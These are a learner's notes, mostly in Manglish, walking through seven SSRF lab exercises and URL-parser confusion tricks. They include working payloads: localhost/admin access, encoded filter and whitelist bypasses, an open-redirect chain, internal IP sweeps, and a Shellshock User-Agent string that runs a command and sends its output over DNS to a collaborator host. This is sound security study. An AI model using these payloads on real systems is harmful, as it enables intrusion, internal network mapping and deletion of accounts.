### Server-side request forgery 
--> SSRF is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location. 
-->In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure

       Lab-1(Basic SSRF against the local server)
-->This lab has a stock check feature which fetches data from an internal system
-->ivide namal site il /admin enn adichal namuk kanam -  Admin interface only available if logged in as an administrator, or if requested from loopback.athayath ee loopback ennath nerwork il ninu mathram keruna sambavamanen thonunu
-->so ini nammal oru product edukuka enit check stock adich ethengilum product inte stock ethra und enn nokuka
-->ini ee check chythathinte request repeater il viduka
-->athil nokiyal kanam stockapi= enna parameter upayogich ethra stock und enn check chyunath
-->so namuk ivide vech admin aayi keran patumon nokanam.so stockapi= inte value maati http://localhost/admin enn koduth send chyumbol namuk admin aayi keran patunund
-->stockApi=http://localhost/admin/delete?username=carlos enn kodukuka apol carlos enna user delete aakum.lab kazhinju

      Lab-2(Basic SSRF against another back-end system)
-->ividem namal ee stock check feature aan exploit chyunath
-->ivide namal internal ip range (192.168.0.X) of admin interface enumerate chyunu on port 8080
-->ee ip thane engane specific aayi kiti enal.lab open chyuka enit ethengilum oru product inte stock check chyuka
-->enit athinte request repeater il kondpoi iduka.avide stockapi=enna kanum athile value ctrl+shift+u adichal decode aakum apol kanam ip
-->so ee ip:8080 mathram aayi send chyuka apol response il missing parameter enn kana
-->==ee lab kond udheshikunath enthenal.oru application server il thane verem back end systems undakum.angane user umayi valiya bandhamonum ilatha matoru back end system the exploit chyan patumonan nokunath==
-->so ivide ee kitiya ip-192.168.0.1 range il vere ethengilum application/back-end run chyunundon ennan nokunath
-->athin ip le avasanathe .1 mati 2,3,... angen nokanam.athin namal burp intruder use chyunu
-->so ee request intruder ilek akuka enit ip ulla bhakam il last .1 $add$ kodukuka enit payload numbers edukuka - from:1,to:255,step:1 kodukuka.start attack
-->ipol result il nokiyal kanam ithil oru ip il matetho application run chynynd enn
-->so ath repeater il viduka enit stockapi=http://192.168.0.213:8080/ enn send chyuka apol not found enn kanum
-->so /admin enn cherkuka apol 200 OK status kanam.angane admin page access chyan patunund
-->ee kitiya response il carlos enn search chyuka apol kanma carlos username um athinte koode carlos user delete chyanula path um so aa path angane thane stockapi= il koduth send adichal aa user account delete aayikolum

     Lab-3(SSRF with blacklist-based input filter)
-->ividem nama stock check chyunu.enit aa request repeater il aakunu
-->enit stockapi=http://localhost enn kodukumbol external stock check blocked enn kanikunu
-->so stockapi=http://127.1 enn kodukumbol 200 OK kitunu
-->so stockapi=http://127.0.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 enn kodukunu (ith admin ennath double url encode chythathan.a enn letter mathram double encode chythalum mathi ivide)
-->ingane chyumbol /admin interface kitunu.ini ithinte koode /delete?username=carlos enn aaki send chythal carlos user account delete aakum


#### orange speech
-->URL COMPONENTS(defined in RFC 3986) 
          example->foo://example.com:8042/over/there?name=bar#nose
           foo                              ->scheme
		   example.com:8042   ->authority
		   /over/there/               ->path
		   name=bar                  ->query
		   nose                           ->fragment

-->ivide foo ennath namal http,https mathram varumbol sradhichal mathi
-->ivide namuk main aayi nokendath scheme,authority and path aan
-->ABUSING THE URL PARSER:
    example->http://127.0.0.1:11211:80
	namukariyal colon aan hostum portum thammil verthirikunath.RFC url management correct aayi chyathathkondanen thonunu pala language ilum parse chyuna reethi vyathyasam und enn thonunu.ivide php readfile and perl LWP port 11211 parse chyumbol php parse_url and perl uri port 80 parse chyunu angane problems undakunu.matoru example nokam
	-->http://google.com#@evil.com/
	       ivide php parse-url google.com parse chyumbol php readfile evil.com parse chyunu.ivide evil.com enna domain aan sherikum parse chyapedunath
-->RFC3968 prakaram authority part varunath // radn slashin sheshaman(ie,http://). and is terminated by another slash /,question mark ? or the hash sign
-->CURL il different aayitan parse/fetch chyunath.example:
           ->http://foo@evil.com:80@google.com/
		   ivide most parser(node.js,php,perl,ruby,go...) recognise google.com as the valid host but CURL mathram evil.com:80 aan valid host aayi kanunath
-->NOTE:oro language inum athintethaya url parser und. ee # symbol use chyumbol ath symbolise chyunath enthenal oru bookmark or referernce pole aayitan.athayath aa page enthengilum oru elementine refernce chyunathpole.ok
-->so ithupole stockapi=il url oke kandal , http://username@stock.weliketoshop.net enn adich nokuka.apol stock.weliketoshop.net parse chyunathin pakaram username aayirikam parse chyunath.username in shasham # ittukoodi try chyanam ok.# ittit prathyakich onum kanikunilengi url econde double encode oke chyth try chyanam.username enn thane kodukanamenila pakaram localhost or localhost:80 ennoke itt kodukam.ie http://localhost#stock.weliketoshop.net 


    Lab-4(SSRF with whitelist-based input filter)
-->ivide whitelist chyth vechathan nammal exploit chyendath
-->nerthe pole thane ethengilum product inte stock check chyuka.enit aa request repeater il iduka
-->ivide stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1  enn kanam.ithil lastethe oke clear chyth stockApi=http://stock.weliketoshop.net:8080 aaki send chyth nokuka
-->ini // in shesham enthengilum koduth oru @ symbol itt send chyth nokuka ie stockApi=http://username@stock.weliketoshop.net:8080.athinu shesham oru # symbol usernamein sheshamayi it try chyth nokuka ie stockApi=http://username#@stock.weliketoshop.net:8080. ithine patti mukalil njan vivarichitund
-->ini ee # symbol double url encode chyuka enit /admin enn last aayi kodukuka.enit username ennath matti real aayi ulla enthengilum host kodukuka ie localhost.ingane chyumbol stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin enn kitum.ini send adichal namuk admin page kitum.so ini satharana pole carlos inte account delete chyuka.ok aayi

    lab-5(SSRF with filter bypass via open redirection vulnerability)
-->ivide namal nerthe pole stock check chyunu 
-->ivide stockapi=/product/stock/check?productId=1&storeId=1 ennan kanan sathikunath.athayath ivide url ila verum path mathrame ulloo.ath mathramalla ingane ullathkond thane vere host names namuk kodukanum patila.karanam path mathrame accept chyu
-->ini aa same page il next product enna oru button und athinte request um repeater il viduka.ith &path=http..  ena parameter und ith https://google.com ennadikumbol IDOR work aakunund
-->so namal aa full path angane eduth ee stockapi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos add chynu.enit IDOR ulla path parameter il nerethe oru labil chythapole correct ip range kandupidichathinu shesham aa ip koduth portum koduth /admin page ilek keran patunu.angane avasanam carlos enna account delete chyan patunu

    Lab-6( Blind SSRF with out-of-band detection)
-->ivide namal referer: header il aa blind ssrf test chyunath
-->so ethengilum product edukuk.athinte /GET request repeateril iduka
-->collborator client edukuk enit ath copy chyth referer:http://clientid kodukuka enit send adikuka
-->eni collaborator il poi poll now adikumbol kanam onnu rand DNS HTTP oke ping aayi kidakunath

    Lab-7(Blind SSRF with Shellshock exploitation)
-->ivide namal lab open chyunu enit oru product button click chyth aa page ilek pokunu
-->burp il poi aa request repeater il idunu enit athile referer header ile link maatunu
-->OR collaborator everywhere enna extension install chyuka enit namal test chyuna site scope il add chyuka enit namma satharana pole site ile oro link,button okke click chyumbol automatic aayi ee extension fuzz chytholum.angane ariyan patum referer header il blind ssrf und enn ok
-->server ee referer header analyse chythitan user eth site il ninan ee request ilek vanath enn check chyunath.so nammal ath maati namude oast server link kodukumbol ariyan patum server ee domain ilek pokunundo,aa server ping chyunundon okke
-->so Referer: https://ygies8ahi73ab9u8d15mjh0lnct2hr.burpcollaborator.net koduth send adich client il poi poll now button click chyumbol kanam athl rand DNS,HTTP request poitund enn
-->ini namal ithil shell shock enna vulnerability test chyunu.ith pande ulla vulnerability aan but internal service il ith patch chythitundavanam ennila.useragent: header il specific aaya oru string (  () { :; };  ) koduthit athinu shesham namuk venda command chyuna oru vulnerabilityan ith
-->so ==useragent: header il - useragent:() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN== kodukuka enit ini enth venamenal namuk internal nertwork scan chyanam
-->athin namal referer header il kodutha collaborator client remove chythit ip range kodukunu ie ->192.168.0.1:8080 (==referer:http://192.168.0.1:8080 ==) .ivide ee ip kodutathenthenal ipe router il namuk default aayi kituna ip aan ith so ee ip range il ethengilum internal services undengil athil ninum namuk result il onum kitila karanam ith blind aanalo but namal control chyuna oast(collaborator client) ith ping aayikolum angane namal adicha command(athayath enth command venelum kodukam.ivide /usr/bin/nslookup aan namal use chyuna command ) aa server il kanikum.ok ath marakaruth
-->REMEMBER - veruthe useragent il shellshock command koduth collaborator client um koodi koduthal aavila internal ip koodi kandethanam
-->so referer: il https://192.168.0.$1$:$port$ ith randum koduth bruteforce chyuka. satharan 8080 or 80 oke aan port undavuka. so 8080 koduth payload type numbers kodukuka 1:256:1 kodukuka start attack kodukuka enit client il poi poll now koduthal aa command work aakunath kanam athayath ivide $(whoami) enna command aan koduthath useragent: il so peter-vkzeiw enna kanikunu.aayi



            
                      